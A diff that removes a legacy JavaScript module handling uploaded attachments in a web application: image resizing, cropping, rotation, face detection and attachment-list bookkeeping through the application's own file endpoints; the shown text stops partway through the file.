@@ -1,1508 +1,1 @@
-if (typeof(font_size)=='undefined')
-   var font_size = 16;
-var ResizeUploaded =
-{
-attachref: null,
-filetobedeleted: null,
-savedfiletodelete: '',
-uploadedattachmen: null,
-uploadedresized: false,
-pathcode: null,
-filename: null,
-picwidth: null,
-picheight: null,
-noattachindex: null,
-noattachurl: null,
-attachindex:null,
-oldattachvalue:null,
-alluploaded : '',
-timestmp:0,
-active:false,
-butwidth:Math.round(4.5*font_size),
-zip: function(str)
-{
-    var s = str.replace(/,$/,'').split(/,/);
-    if (str.indexOf("|") > 0 || s.length ==1) 
-        return str;
-    var i=0;
-    var l = s[0].lastIndexOf("@");
-    while (true)
-    {
-        for (var j=1; j < s.length; j++)
-        {
-            var k = s[j].lastIndexOf("@");
-            if (i+l+1 == s[0].length  || i+k+1 == s[j].length || s[j].charAt(i+k+1) != s[0].charAt(i+l+1)) 
-              break;  
-        }
-        if (j < s.length )
-        {
-             break;
-        }
-        else  i++;
-    }
-    var y = s[0] + ",";
-    for (var j=1; j < s.length; j++)
-    {
-        var k = s[j].lastIndexOf("@");
-        var i=0;
-        while ( i+l+1 < s[0].length  &&  i+k+1 < s[j].length && s[j].charAt(i+k+1) == s[0].charAt(i+l+1)) 
-            i++;
-        if (i > 0)
-            y += s[j].substring(0,k+1) +  i + "|" + s[j].substring(i+k+1) + ",";  
-        else
-            y += s[j] + ",";
-    }
-    return y;
-},
-
-unzip : function(str)
-{
-    if (str == null) return str;
-    if (typeof(str.tagName)!='undefined' && str.tagName.toLowerCase() == 'input')
-    {
-        str = str.value;
-    }
-    var s = str.replace(/,$/,'').split(/,/);
-    if (str.indexOf("|") < 0 || s.length ==1) 
-        return str;
-    str = s[0] + ",";
-    var l = s[0].lastIndexOf("@");
-    for (var j=1; j < s.length; j++)
-    {
-         var k = s[j].indexOf("|");
-         if (k < 0)
-            str += s[j] + ","; 
-         else
-         {
-            var m = s[j].lastIndexOf("@");
-            var n = parseInt(s[j].substring(m+1,k));
-            str += s[j].substring(0,m+1) + s[0].substring(l+1,l+n+1) + s[j].substring(k+1) + ",";
-         }
-    }
-    return str;
-}, 
-widthnow:0,
-heightnow:0,
-xnow:0,
-ynow:0, 
-isimg:true,
-fileinexam:null,
-uploaded : function (z, fn,atc)
-{
-    
-    var regloc = fn;
-    var locat = document.location.toString();
-    if (atc != null)
-    {
-        ResizeUploaded.attachref = atc;
-    }
-    
-    if (z.length > 4)
-    {
-        regloc = locat.replace(/[^\\/]+$/,  "FileOperation?did=" + z.substring(4));
-    }
-    var imgpath = "FileOperation?did=" + z.substring(4);  
-    var tt = fn;
-    ResizeUploaded.isimg = false;
-    ResizeUploaded.noattachurl = regloc;
-    ResizeUploaded.fileinexam = fn + '@'+ z.substring(4);
-    if (ResizeUploaded.attachref!=null)
-    {
-        var xx = ResizeUploaded.unzip(ResizeUploaded.attachref.value); 
-        var jj = ("," + xx ).indexOf("," + fn.replace(/@.*/, '@'));
-        
-        if ( jj < 0 )
-            xx =  ResizeUploaded.fileinexam  + "," + xx;
-        ResizeUploaded.attachref.value = ResizeUploaded.zip(xx);
-    }
-    /*
-    //ResizeUploaded.oldattachvalue = ResizeUploaded.attachref.value; 
-    ResizeUploaded.attachman(ResizeUploaded.attachref);
-    */
-    if (typeof(beforeclose)!='undefined') 
-    window.onbeforeunload = beforeclose;
-
-    var fen = fn.replace(/@.*/, '');
-    var jj = fen.lastIndexOf(".");
-    fen = fen.substring(jj + 1).toLowerCase();
-    var ss = '';
-    ResizeUploaded.pathcode = z.substring(4);
-    ResizeUploaded.filename = fn;
-    var wordfor = textmsg[1293].split(/@/);
-   
-    if ((fen == 'jpg' || fen == 'jpeg' || fen == 'gif' || fen == 'png') && z.length > 4 && (z.charAt(3) == '/'  ))
-    {
-       // var hasfile = ResizeUploaded.attachref.value.indexOf("@" + fn.replace(/@.*/, '') + "@");
-        var hasfile1 = ResizeUploaded.unzip(ResizeUploaded.attachref.value).indexOf("@" + fn.replace(/@.*/, '') + "@");
-        
-        var cancut = ResizeUploaded.attachref==null ||  hasfile1< 0;
-        ResizeUploaded.isimg = true;
-        ResizeUploaded.picwidth = 0;
-        ResizeUploaded.picheight = 0;
-        var wt = 4*ResizeUploaded.butwidth;
-        if (cancut) wt += 3*ResizeUploaded.butwidth + 30;
-        ss = "<table  class=outset1 style=\"border-radius:3px;border:0px #d0d0d0 outset\" id=uploadinstru cellspacing=2 cellpadding=2 ><tr>";
-        var s1 = '';
-        var s2 = ''; var ii = 0;
-        
-        if (cancut) 
-        {    
-         ss +=  "<td><select id=resizesel style=\"width:" + ResizeUploaded.butwidth + "px;overflow:hidden;border:1px #b0b0b0 solid;margin:0px 0px 0px 0px;border-radius:3px\" onchange=ResizeUploaded.resizeonly(this,'" + z.substring(4) + "','" + fn + "')><option selected>100%</option>"
-            + "<option>5%</option><option>10%</option><option>20%</option><option>25%</option><option>30%</option><option>40%</option><option>50%</option><option>75%</option>"
-            + "<option>125%</option><option>150%</option><option>200%</option></select></td>";
-        
-        ss += "<td style=\"background-color:orange;color:white;border:1px #b0b0b0 outset;width:"+ ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\"   align=center onclick=\"ResizeUploaded.swapproc(this)\"><nobr>"+ textmsg[1295] + "</nobr></td>";
-           
-        //ss += "<td style=\"background-color:#BBBB00;color:white;border:1px #b0b0b0 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\" align=center onclick=\"ResizeUploaded.cropshow(null)\"><nobr>"+ textmsg[1632] + "</nobr></td>";
-        ss += "<td style=\"background-color:#BBBB00;color:white;border:1px #b0b0b0 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\" align=center onclick=\"ResizeUploaded.cropuse()\"><nobr>"+ textmsg[1357] + "</nobr></td>";
-        }
-        
-        ss += "<td style=\"background-color:#b0b0b0;color:white;border:1px #808080 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\"  align=center onclick=ResizeUploaded.cropuse(1)><nobr>"+ textmsg[1359] + "</nobr></td>";
-        ss += "<td style=\"background-color:white;color:black;border:1px #808080 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\"  align=center onclick=ResizeUploaded.readbw()><nobr>"+ textmsg[1630] + "</nobr></td>";
-        ss += "<td style=\"background-color:red;color:white;border:1px #b0b0b0 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\"  align=center  onclick=\"ResizeUploaded.deleteit()\"><nobr>" + textmsg[69]  + "</nobr></td>";
-        if (document.location.toString().indexOf('talkpage.jsp')<0 && document.location.toString().indexOf('webfolder.jsp')<0 && typeof(Play)=='undefined')
-        ss += "<td style=\"background-color:#BBBB00;color:white;border:1px #b0b0b0 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\"  align=center  onclick=\"ResizeUploaded.cropuse(3)\"><nobr>" + textmsg[1303]  + "</nobr></td>";
-        ss += "<td style=\"background-color:#BBBB00;color:white;border:1px #b0b0b0 outset;font-weight:700;border-radius:3px;cursor:pointer\"  align=center ><img height=" + (font_size + 4) + " src=image/nophoto.jpg  onclick=\"ResizeUploaded.detectface()\"></td>";
-        if (cancut && (ResizeUploaded.attachref==null ||ResizeUploaded.unzip(ResizeUploaded.attachref.value).replace(new RegExp(",[0-9][0-9]?@"+fn.replace(/@.*/,'')),"")== ResizeUploaded.unzip(ResizeUploaded.attachref.value))) 
-        {
-           ss +=  "<td><input id=rotatesel style=\"width:" + ResizeUploaded.butwidth + "px;overflow:hidden;border:1px #b0b0b0 solid;margin:0px 0px 0px 0px;border-radius:3px;width:30px\" onchange=ResizeUploaded.rotateonly(this,'" + z.substring(4) + "','" + fn + "') value=0 ></td><td>&deg;</td>";
-        } 
-        else 
-        {
-           ss +=  "<td></td>";
-        }
-        ss += "</tr></table><img id=\"imgwork\" src=\"" + imgpath + "&tcode=" + (new Date()).getTime()%1000000000 + "\"  style=\"margin:0px 0px 0px 0px\" onload=ResizeUploaded.goodposition(this)>";
-        closeprompt();
-        
-        myprompt(ss, null, null, textmsg[1296]);
-        if (promptwin!=null && promptwin.getElementsByTagName('table')!=null && promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')!=null)
-        {
-            promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0].style.padding = "0px 0px 0px 0px";
-            promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('img')[0].onclick
-            = function(){var b = document.getElementById("dragcropbox"); if (b!=null) document.body.removeChild(b);ResizeUploaded.cropuse();} 
-        }
-        //if (isu)   ResizeUploaded.cropshow(document.getElementById('cropfield'));
-    }
-    else
-    {
-        
-        ss = "<table class=outset1 style=\"border-radius:3px;border:0px #d0d0d0 outset\" id=uploadinstru cellspacing=2 cellpadding=2 ><tr>";
-        ss += "<td style=\"background-color:#BBBB00;color:white;border:1px #b0b0b0 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\" align=center onclick=\"ResizeUploaded.docuse()\">"+ textmsg[1357] + "</td>";
-        ss += "<td style=\"background-color:red;color:white;border:1px #b0b0b0 outset;width:" + ResizeUploaded.butwidth + "px;font-weight:700;border-radius:3px\"  align=center  onclick=\"ResizeUploaded.deleteit()\"><nobr>" + textmsg[69]  + "</nobr></td></tr>";
-        ss += "</table>";
-        myprompt(ss, null, null, wordfor[0]);
-        promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('img')[0].onclick
-        = function(){ResizeUploaded.docuse();}
-        if (typeof (showattachment) != 'undefined') 
-        {
-            showattachment(ResizeUploaded.attachref.value);
-        }
-            
-        //ResizeUploaded.alluploaded += ResizeUploaded.filename + '@' + ResizeUploaded.pathcode + ','; 
-    }
-    
-},
-detectface : function()
-{
-       /* var savedredourl = "UploadFace?pathcode=" + ResizeUploaded.pathcode +   "&tcode=" + ResizeUploaded.filename.replace(/^[^@]+@/,"");
-        if (typeof(startface) != 'undefined')
-        savedredourl += "&CourseId=" + currentcid + "&Session=" + (numRows>0?mat[0][0]:defaultRecord[0]);
-        window.open(savedredourl,'w'+tstmp);*/
-        var xmlhttp;
-        if (window.XMLHttpRequest)
-        {
-            xmlhttp = new XMLHttpRequest();
-        }
-        else
-        {
-            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-        }
-        xmlhttp.onreadystatechange = function()
-        {
-            if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
-            {
-                var y = xmlhttp.responseText;
-                if (y!=null && y!='')
-                { 
-                  
-                    if (y.indexOf('<html>') > 0 && y.indexOf('<body ')>0)
-                    {
-                        var x= window.open('', 'w' + tstmp);
-                        x.document.write(y);
-                    }
-                    else eval(y);
-                }
-            }
-        }
-        var f = new FormData();
-        f.append('pathcode',ResizeUploaded.pathcode);
-        
-        if (typeof(startface) != 'undefined'  )
-        { 
-            f.append('CourseId', currentcid);
-            f.append('Session', (numRows>0?mat[0][0]:defaultRecord[0]) );
-        }
-        xmlhttp.open('POST', "UploadFace", true);
-        xmlhttp.send(f);
-        
-}, 
-
-facedim : function (alln)
-{
-     var r = new RegExp(",[0-9]+@");
-     var s = ResizeUploaded.unzip(ResizeUploaded.attachref.value);
-     var k = 0;
-     var m;
-     var j = 0;
-     while ( (m = r.exec(s.substring(k))) != null)
-     {
-         j = parseInt(m.toString().replace(/[^0-9]/g, ''));
-         k += m.index + m.toString().length;
-     }
-     if (alln == '') return;
-     var ns = alln.replace(/,$/,'').split(/,/) ;
-     var imgs = '<table><tr>';
-     var ww = 0; 
-     var had = false;
-     for (var i=0; i <= ns.length-4; i+=4)
-     {var w = parseInt( ns[i+2]);var  h =  parseInt( ns[i+3])
-          var x = parseInt( ns[i]) - Math.round(0.13*w);
-          var y = parseInt( ns[i+1]) - Math.round(0.25*h);
-          w += Math.round(0.26*w);
-          h += Math.round(0.5*h);
-          ww += w;
-          if (ww > 720){imgs += '</tr></table><table><tr>'; ww = w;had = true;} 
-          imgs += '<td><table><tr height=' + h + '><td width=' +w +' style="background-image:url(FileOperation?did='+
-          ResizeUploaded.pathcode + ');background-position:-' + x + 'px -' + y + 'px" > </td></tr></table></td>';
-          s = s + (++j) + "@" + ResizeUploaded.filename.replace(/@.*/,'') + "@" + x  + "_" +  y + "_" +  w + "_" +  h + ",";
-     }
-     ResizeUploaded.attachref.value = ResizeUploaded.zip(s);
-     myprompt(imgs + '</tr></table>');
-     if (had)
-         promptwin.style.width = '740px';
-     else 
-         promptwin.style.width = (ww+30) + 'px';
-     //ResizeUploaded.attachman(ResizeUploaded.attachref);
-},
-goodposition:function(im)
-{
-    
-    if (ResizeUploaded.ynow + im.height + 60 > ResizeUploaded.heightnow)
-    {
-       ResizeUploaded.ynow = ResizeUploaded.heightnow - im.height - 60;
-       if (ResizeUploaded.ynow < 0) ResizeUploaded.ynow = 0;
-    }
-    
-    if (ResizeUploaded.xnow + im.width + 5 > ResizeUploaded.widthnow)
-    {
-       ResizeUploaded.xnow = ResizeUploaded.widthnow - im.width - 5;
-       if (ResizeUploaded.xnow < 0) ResizeUploaded.xnow = 0;
-    }
-    
-    promptwin.style.top = document.body.scrollTop + 'px';//    ResizeUploaded.ynow +  'px';
-    promptwin.style.left = ResizeUploaded.xnow +  'px'; 
-},
-deleteit : function()
-{
-    var usefield = document.getElementById("usefield");
-    if (usefield!=null)
-    {
-        usefield.selectedIndex = 0;
-    }
-    var url = "UploadChangePic?pathcode=" + ResizeUploaded.pathcode +  "&tcode=" +  (ResizeUploaded.filename.replace(/^[^@]+@/,""));
-   
-    postopen(url,"w" + tstmp);
-    //closeprompt();
-     
-},
-readbw : function()
-{
-     
-    var pic = document.getElementById('imgwork');
-    var p = pic.parentNode;
-    p.insertBefore(document.createTextNode(textmsg[1631]),pic);
-    var btn = document.createElement('input');
-    btn.className = 'OrangeButton';
-    btn.style.cssText = 'width:' + ResizeUploaded.butwidth + 'px;align:center';
-    btn.type='button';
-    btn.value = textmsg[848];
-    btn.onclick = function(){ResizeUploaded.cropuse(2)};
-    p.insertBefore(btn,pic);
-    btn = document.createElement('input');
-    btn.className = 'GreenButton';
-    btn.style.cssText = 'width:' + ResizeUploaded.butwidth + 'px;align:center';;
-    btn.type='button';
-    btn.value = textmsg[849];
-    btn.onclick = function(){var pic = document.getElementById('imgwork');var p = pic.parentNode;p.removeChild(pic.previousSibling);p.removeChild(pic.previousSibling);p.removeChild(pic.previousSibling);};
-    p.insertBefore(btn,pic);
-    ///myprompt(textmsg[1631], null, "if(v) ResizeUploaded.cropuse(2)", textmsg[1630]); 
-},
-docuse : function()
-{
-    
-    //savedredourl = "UploadChangePic?pathcode=" + ResizeUploaded.pathcode + "&rdap=" + rdapname + "&tcode=" + ResizeUploaded.filename.replace(/^[^@]+@/,"");
-    //window.open(savedredourl, "w" + tstmp); 
-    closeprompt();
-},
-dosplitnow: false,
-cropuse : function(bw)
- {
-   //if (typeof(showattachment)!='undefined')   showattachment(allentries);
-   ResizeUploaded.dosplitnow = false;
-   if (bw!=null && bw==3)
-   {
-      ResizeUploaded.dosplitnow = true;
-      bw =null;
-   }
-   
-   var needsubmit = (bw!=null);
-   var url = "UploadChangePic?pathcode=" + ResizeUploaded.pathcode +  "&tcode=" + ResizeUploaded.filename.replace(/^[^@]+@/,"");
-   var b = null;
-    
-    var pic = document.getElementById('imgwork');
-    var XY = findPositionnoScrolling(pic);
-    var w = pic.offsetWidth;
-    var h = pic.offsetHeight;
-    //needsubmit = false; 
-    if (ResizeUploaded.uploadedresized)
-    {
-        needsubmit = true;
-        url += "&rwidth=" + w + "&rheight=" + h;
-    }
-
-    b = document.getElementById("dummycenter");
-    if ( b != null)
-    {
-        var cw = b.offsetWidth;
-        var ch = b.offsetHeight;
-        var xy = findPositionnoScrolling(b);
-        xy[0] -= XY[0];
-        xy[1] -= XY[1];
-        if (xy[0] < 0)
-            xy[0] = 0;
-        if (xy[1] < 0)
-            xy[1] = 0;
-        if (cw < w && ch < h)
-        {    
-            url += "&cropx=" + xy[0] + "&cropy=" + xy[1] + "&cwidth=" + cw + "&cheight=" + ch;
-            needsubmit = true;
-        }
-    }
-
-    if (typeof(showattachment)!='undefined')
-        showattachment(ResizeUploaded.attachref.value);
-    if (typeof(beforeclose)!='undefined')  
-    window.onbeforeunload = beforeclose;
-    
-    if (needsubmit) 
-    {
-       if (bw!=null) url += "&whiteblack="+bw;
-      
-       savedredourl = url;
-       window.open(url, "w" + tstmp);
-    }
-     
-    
-    
-     if ( b!= null) 
-        b.parentNode.removeChild(b);
-     if (!needsubmit && ResizeUploaded.dosplitnow) 
-     {
-        ResizeUploaded.cutoff(); 
-     }
-     else
-         closeprompt();
- },
- 
- 
-resizeonly : function (sel  )
-{
-   
-    var box = document.getElementById("dragcropbox");
-     
-    if (sel.selectedIndex < 0)
-        return;
-
-    var p = parseInt(sel.options[sel.selectedIndex].text.replace(/%/, ''));
-    var pic = document.getElementById('imgwork');
-    if (ResizeUploaded.picwidth == 0 || ResizeUploaded.picheight == 0) 
-    {
-        ResizeUploaded.picwidth = pic.width;
-        ResizeUploaded.picheight = pic.height;
-    }
-    var w = Math.round(p * ResizeUploaded.picwidth / 100);
-    var h = Math.round(p * ResizeUploaded.picheight / 100);
-    
-    pic.style.width = w + 'px';
-    pic.width = w;
-    pic.style.height = h + 'px';
-    pic.height = h;
-    
-    var w0 = document.getElementById("uploadinstru").offsetWidth;
-    setRoundedSize(promptwin, (w0>w?w0:w), h+40)  ;
-    ResizeUploaded.uploadedresized = (p!=100);
-     
-},
-
-rotateonly : function (edt,z,fn)
-{
-    if(typeof(rdapname)=='undefined') var rdapname = 'assign';
-    var url = "UploadChangePic?pathcode=" + z + "&rdap=" + rdapname + "&tcode=" + fn.replace(/^[^@]+@/,"");
-    url += "&rwidth=-1&rheight=" + (edt.value);
-    savedredourl = url;
-    window.open(url, "w" + tstmp);
-},
-
-swapproc : function(td)
-{
-    
-    var tr = td.parentNode;
-    var tds = tr.cells;
-    var len = tds.length;
-   
-    if (td.innerHTML.replace(/<[^>]+>/g,'') == textmsg[1295])
-    {
-      
-        ResizeUploaded.cropshow(td);
-      
-        td.innerHTML = "<nobr>" + textmsg[1645] + "</nobr>";
-        
-        for (var j = len - 1; j >  len - 6; j--)
-        {
-            if (tds[j].innerHTML.replace(/<[^>]+>/g,'') == textmsg[1357])
-                break;
-            tds[j].style.visibility = 'hidden';
-        }
-    }
-    else
-    {
-        td.innerHTML =  "<nobr>" + textmsg[1295] + "</nobr>";
-        var box = document.getElementById("dragcropbox");
-        if (box != null)  document.body.removeChild(box);
-        for (var j = len - 1; j >  len - 6; j--)
-        {
-            if (tds[j].innerHTML.replace(/<[^>]+>/g,'') == textmsg[1357])  break;
-            tds[j].style.visibility = 'visible';
-        }
-    }
-},
-cropshow : function (sel)
-{
-    var box = document.getElementById("dragcropbox");
-    if (box != null)
-        document.body.removeChild(box);
-    var k = -1;
-    if (sel!=null && sel.tagName.toUpperCase()=='SELECT') 
-        k = parseInt(sel.options[sel.selectedIndex].value);
-    var w = 100, h =100;
-    if (k > -1)
-    {
-        w = parseInt('' + fsize[k]);
-        if (''+w == 'NaN') w = 100;
-        if (ffsize[k] == null || ffsize[k] == '' || isNaN(ffsize[k]))
-        {
-            h = w;
-        }
-        else
-        {
-            h = parseInt('' + ffsize[k]);
-        }
-    }
-    else
-    {
-       var pic = document.getElementById('imgwork');
-       if (pic!=null && pic.width >0 && pic.height > 0)
-       {   
-           w = Math.round(pic.width * 0.7);
-           h = Math.round(pic.height * 0.7);
-       } 
-    }
-     
-    if (k>=0 && k < numCols)
-    {
-        var usefield = document.getElementById("usefield");
-        if (usefield!=null)
-        {
-            for (var i=0; i < usefield.options.length; i++)
-            if (usefield.options[i].value == k)
-            {
-                usefield.selectedIndex = i;
-                break;
-            } 
-        }
-    }
-    ResizeUploaded.showframe(w, h  );
-},
-showframe : function(w, h )
-{
-    
-    var pic = document.getElementById('imgwork');
-    var xy = findPositionnoScrolling(pic);
-    if (1==2 && (h > pic.offsetHeight && pic.offsetHeight > 0 || w > pic.offsetWidth && pic.offsetWidth>0 ))
-    {
-        var ro = (h / pic.offsetHeight);
-        if (ro < w / pic.offsetWidth)
-            ro = w / pic.offsetWidth;
-        var ww = Math.ceil(ro * pic.offsetWidth + 2);
-        var hh = Math.ceil(ro * pic.offsetHeight + 2);
-        pic.height = hh;
-        pic.width = ww;
-        pic.style.height = hh + 'px';
-        pic.style.width = ww + 'px';
-       
-    }
-    var z = 21;
-    if (typeof (promptwin.style.zIndex) != 'undefined')
-        z = promptwin.style.zIndex;
-    if (typeof (pic.style.zIndex) != 'undefined' && z < pic.style.zIndex)
-        z = pic.style.zIndex;
-
-    var box = document.createElement("div");
-    box.id = "dragcropbox";
-    box.style.cssText = "position:absolute;left:" + xy[0] + "px;top:" + xy[1]
-            + "px;z-index:" + (z + 1) + ";background-color:transparent;border:1px #909090 broken;align:center;vertial-align:middle";
-    box.innerHTML = round1('100%') + "<div id=dummycenter style=\"background-color:#eee;opacity:0.3;width:" + w + "px;height:" + h + "px;border-radius:3px\"></div>" + round2  ;
-    document.body.appendChild(box);
-    box.getElementsByTagName('table')[0].cellPadding='0';
-    box.getElementsByTagName('table')[0].cellSpacing='0';
-    box.getElementsByTagName('table')[0].rows[2].cells[2].innerHTML = "<div><img src=image/diskbg.png></div>"
-    new ResizeRounded(box,ResizeUploaded.resizeblank);
-    Drag.init(box.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('div')[0], box);
-},
- 
-moveTo :function(r)
-{
-    var box = document.getElementById("dragcropbox");
-    var pic = document.getElementById("imgwork");
-    var dox = document.getElementById("dummycenter");
-    var w0 = dox.offsetWidth;
-    var h0 = dox.offsetHeigh;
-    if (w0 > r[2])
-    {
-        dox.style.width = ( r[2]) + 'px';
-        dox.parentNode.width = r[2];
-        dox.parentNode.parentNode.parentNode.width = ( r[2]+24);
-        box.style.width = ( r[2]+24) + 'px'; 
-    }
-    else
-    {
-        box.style.width = ( r[2]+24) + 'px'; 
-        dox.parentNode.parentNode.parentNode.width = ( r[2]+24);
-        dox.parentNode.width = r[2];
-        dox.style.width = ( r[2]) + 'px';
-    }
-    if (h0 > r[3])
-    {
-        dox.style.height = ( r[3]) + 'px';
-        dox.parentNode.parentNode.height = r[3];
-       
-        box.style.height = ( r[3]+24) + 'px'; 
-    }
-    else
-    {
-        box.style.height = ( r[3]+24) + 'px'; 
-        dox.parentNode.parentNode.height = ( r[3]);
-        dox.style.height = ( r[3]) + 'px';
-    }
-     
-    var xy = findPositionnoScrolling(pic);
-    box.style.left = (xy[0] + r[0]) + 'px';
-    box.style.top = (xy[1] + r[1]) + 'px';
-    
-},
-
-resizeblank : function(td, dx, dy)
-{
-    var b = document.getElementById('dummycenter');
-    var d = document.getElementById('dragcropbox');
-    if (dx > 0)
-    {
-        d.style.width = (d.offsetWidth + dx) + 'px';
-        b.style.width = (b.offsetWidth + dx) + 'px';
-    }
-    else
-    {
-        b.style.width = (b.offsetWidth + dx) + 'px';
-        d.style.width = (d.offsetWidth + dx) + 'px';
-    }
-    
-    if (dy > 0)
-    {
-        d.style.height = (d.offsetHeight + dy) + 'px';
-        b.style.height = (b.offsetHeight + dy) + 'px';
-    }
-    else
-    {
-        b.style.height = (b.offsetHeight + dy) + 'px';
-        d.style.height = (d.offsetHeight + dy) + 'px';
-    }
-    
-},
-
-updatepic : function()
-{
-    var pic = document.getElementById('imgwork');
-    if (pic!=null)
-    {
-        var s = pic.src;
-        pic.src = s;
-    }
-},
-
-setattachref : function(x)
-{
-   if( x != ResizeUploaded.attachref)
-   ResizeUploaded.attachref = x;
-},
-getattachref : function ()
-{
-   return ResizeUploaded.attachref;
-},
-
-setfiletobedel : function (filename)
-{
-    ResizeUploaded.filetobedeleted = filename;
-},
-updateattch : function ()
-{
-  
-   if ( ResizeUploaded.filetobedeleted ==null) return;
-    
-   if (ResizeUploaded.attachref != null )
-   {
-      var x = ResizeUploaded.unzip(ResizeUploaded.attachref.value);
-      if (x.indexOf('@')<0) x = '';
-      var x0 = ResizeUploaded.attachref.value;
-      var j = x.indexOf(ResizeUploaded.filetobedeleted + ",");
-      var k = ResizeUploaded.filetobedeleted.length + 1;
-      if (ResizeUploaded.attachref.value.replace(/[^,]/g,'').length < 2 && k>1)
-      {
-          ResizeUploaded.attachref.value = ''; 
-      }
-      else
-      {
-          if (j> 0)
-              x = x.substring(0,j) + x.substring(j+k);
-          else if(j == 0)
-              x = x.substring(k);
-         if (ResizeUploaded.ifdelfilealso) 
-         {
-              var y = '@' + ResizeUploaded.filetobedeleted.replace(/@.*/,'') + "@";
-              var z = '', j =0, k =0;
-              while ( (k = x.indexOf(y)) > 0)
-              {
-                  x = x.substring(0,k)  + ( k+y.length < x.length? x.substring(k+y.length) : '');
-              }
-              x = x.replace(/,[0-9|_]+,/g,',').replace(/^[0-9|_]+,$/g,',');
-          }
-          ResizeUploaded.ifdelfilealso = false;
-          ResizeUploaded.attachref.value = ResizeUploaded.zip(x);
-      }
-      
-     }  
-     
-      x = ResizeUploaded.unzip(ResizeUploaded.attachref.value);
-     
-      var j = x.indexOf(ResizeUploaded.filetobedeleted + ",");
-      var k = ResizeUploaded.filetobedeleted.length + 1;
-      if (j> 0)
-          x = x.substring(0,j) + x.substring(j+k);
-      else if (j == 0)
-          x = x.substring(k);
-      ResizeUploaded.attachref.value = ResizeUploaded.zip(x);
-       
-      if (typeof(showattachment)!='undefined')
-                showattachment(x);
-      ResizeUploaded.filetobedeleted = null;
-},
-
-openmid : function(url,x,y)
-{
-  if (x==null) 
-      x= '300';
-  else 
-      x = Math.round(x);
-  if (y == null) 
-      y = '300';
-  else
-      y = Math.round(y);
-  myprompt('<iframe src="' + url + '" width=' + x + " height=" + y + " />");
-  //window.open(url,'winname', 'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=1,resizable=1,width='+x +',height=' +y +',top=' +(screen.height-y)/2+',left=' + (screen.width-x)/2);
-  
-},
-
-refreshatt : function()
-{
-    closeprompt();
-    ResizeUploaded.updateattch();
-    ResizeUploaded.attachman(ResizeUploaded.attachref);
-},
-ifdelfilealso : false,
- 
-deleteAttachedFile : function (file)
-{
-   
-   var xs = file.split(/@/);
-   ResizeUploaded.setfiletobedel(file);
-   if (xs.length==2 && xs[1].indexOf('http')==0)
-   {
-       var parse = new CSVParse(ResizeUploaded.unzip(ResizeUploaded.attachref.value).replace(/,$/,''),"'", "@",",").nextMatrix();
-       var ss = '';
-       for (var i=0; i < parse.length; i++)
-           if (parse[i].length==2 && parse[i][0]==xs[0] && parse[i][1].indexOf('http')==0
-               ||parse[i].length==3 && !isNaN(parse[i][0])&& parse[i][1]==xs[0]&& parse[i][2].replace(/[0-9]/g,'')=='___')
-           ;
-           else if (parse[i].length == 3)
-              ss += parse[i][0] + '@' + parse[i][1] + '@' + parse[i][2] + ',';
-           else 
-              ss += parse[i][0] + '@\'' + parse[i][1] + '\',';
-        ResizeUploaded.attachref.value = ResizeUploaded.zip(ss);
-        ResizeUploaded.attachman(ResizeUploaded.attachref);
-   }
-   else if (xs[2] ==null ||  xs[2].length < 2 || xs[1] == null || xs[1].replace(/[0-9]/g,'')!='')
-   {
-       syn('del',xs[2]);
-   }
-   else
-   {
-       ResizeUploaded.ifdelfilealso = false;
-       ResizeUploaded.savedfiletodelete ="UploadChangePic?pathcode=" + xs[2] + '&tcode=' + xs[1];
-       var mm = textmsg[809] + "?";
-       if (xs[0].toLowerCase().indexOf('.jpg') >0 || xs[0].toLowerCase().indexOf('.png') >0 || xs[0].toLowerCase().indexOf('.gif') >0
-               || xs[0].toLowerCase().indexOf('.pdf') >0)
-          mm += "<br><input type=checkbox name=ifdeletefile  onclick=\"ResizeUploaded.ifdelfilealso=this.checked\">" + textmsg[1601];
-       myprompt(mm,null,"ResizeUploaded.delgoahead(v)");
-   }
-       
-},
-showback : function()
-{
-    ResizeUploaded.attachman(ResizeUploaded.attachref);
-},
-delgoahead : function(v)
-{
- 
-   if (v == false) 
-       ResizeUploaded.showback();
-   else
-   {
-       savedredourl = ResizeUploaded.savedfiletodelete;
-       nav1 = window.open(ResizeUploaded.savedfiletodelete,'w' + tstmp);
-   }
-   closeprompt();
-},
-openAttachedFile : function(codedpath, filename)
-{
-    var fn= filename.toLowerCase();
-    var dd = (fn.indexOf('.gif')>=0 || fn.indexOf('.jpg')>=0 || fn.indexOf('.jpeg')>=0 || fn.indexOf('.png')>=0);
-    if(dd == false)
-    {
-        var  fsnd1 = document.getElementById("openfileform_id");
-        if ( fsnd1 == null)
-        {
-            fsnd1 = document.createElement("form");
-            fsnd1.name = "openfileform";
-             fsnd1.id = "openfileform_id";
-            if (codedpath.indexOf('http://') == 0 || codedpath.indexOf('https://') == 0)
-                formnewaction(fsnd1,codedpath);
-            else
-                formnewaction(fsnd1,"FileOperation");
-            fsnd1.method = 'post';
-            fsnd1.target = "_blank" ;
-            fsnd1.innerHTML = "<input type=hidden name=did><input type=hidden name=operation value=open>";
-            document.body.appendChild(fsnd1);
-        }
-        fsnd1.did.value = codedpath;
-        formnewaction(fsnd1);
-        
-       visual(fsnd1);
-       fsnd1.submit();
-    }
-    else 
-    {
-         var showarea =  document.getElementById('codeshow');
-         showarea.style.padding = "0px 0px 0px 0px";
-         showarea.innerHTML = "<img src=" + ResizeUploaded.goodopenurl(codedpath,false) + " onload=\"ResizeUploaded.fitting(this)\" style=\"margin:0px 0px 0px 0px\" >";
-         var tbl = document.getElementById('attachaction');
-        
